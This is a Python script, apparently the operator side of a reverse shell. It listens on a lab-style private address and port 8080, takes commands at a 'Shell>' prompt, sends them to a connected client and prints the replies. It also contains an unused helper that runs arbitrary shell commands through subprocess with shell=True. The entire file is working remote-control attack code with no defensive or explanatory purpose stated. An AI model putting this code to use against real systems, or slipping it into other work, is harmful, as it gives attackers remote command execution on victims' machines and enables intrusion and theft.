import socket  # Import the socket module to facilitate network communication.
import subprocess  # Import subprocess to execute shell commands.

def execute_command(command):
    """Executes a shell command and returns its output.
    
    Args:
        command (str): The shell command to execute.
    
    Returns:
        str: The command output or error message.
    """
    try:
        # Execute the command and return its output.
        return subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        # If an error occurs, return the error message.
        return str(e)

def main():
    """Sets up a TCP server to listen for incoming connections and execute shell commands."""
    
    # Create a TCP server socket and bind it to the given IP address and port.
    server = socket.create_server(("192.168.73.128", 8080))
    print("[+] Listening for incoming TCP connection on port 8080")
    
    # Accept an incoming client connection.
    client_socket, client_address = server.accept()
    print(f"[+] Connection from {client_address}")
    
    # Continuously prompt the user for shell commands until "exit" or "quit" is entered.
    while (command := input("Shell> ")) not in ["exit", "quit"]:
        # Send the command to the connected client.
        client_socket.send(command.encode())
        # Receive and print the response from the client.
        print(client_socket.recv(4096).decode())
    
    # Close the client and server sockets when the session ends.
    client_socket.close()
    server.close()

# If the script is executed directly, run the main function.
if __name__ == "__main__":
    main()
